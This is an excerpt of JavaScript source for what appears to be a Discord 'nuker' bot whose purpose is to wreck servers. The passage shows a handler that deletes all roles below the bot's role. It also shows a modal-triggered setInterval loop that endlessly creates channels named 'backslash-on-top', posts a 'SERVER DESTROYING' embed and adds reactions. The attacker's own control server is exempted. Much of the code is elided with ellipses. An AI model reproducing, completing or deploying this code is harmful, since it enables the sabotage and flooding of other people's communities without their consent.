...
client.on("interactionCreate", async interaction =>{
  ...
  if(controlguild == guild.id)return interaction.reply({content: "cannot nuke control server", ephemeral: true})
  ...
  if(interaction.isButton()){
    if(interaction.customId.startsWith("deleteallroles")){
      ...
      interaction.reply({content: "Request sent, can only delete roles under bot role.",ephemeral:true})
  ...
  if(interaction.isModalSubmit()){
    if(interaction.customId.startsWith("spam_")){
      ...
      let badblood = new EmbedBuilder().setColor("Red").setDescription("**[backslashg](https://www.backslashg.com/)** | SERVER DESTROYING :D\u200B\n\u200B\n"+message)
      interaction.reply({content: "Request sent",ephemeral:true})
      
      setInterval(() => {
        guild.channels.create({name: "backslash-on-top",type: ChannelType.GuildText}).then(e=> {
          e.send({embeds: [badblood]}).then(e=> {
            e.react("🤓"); e.react("🥇"); e.react("🇧"); e.react("🇽"); e.react("🇴"); e.react("🇳"); e.react("🇹");e.react("🇾");
          })
        })
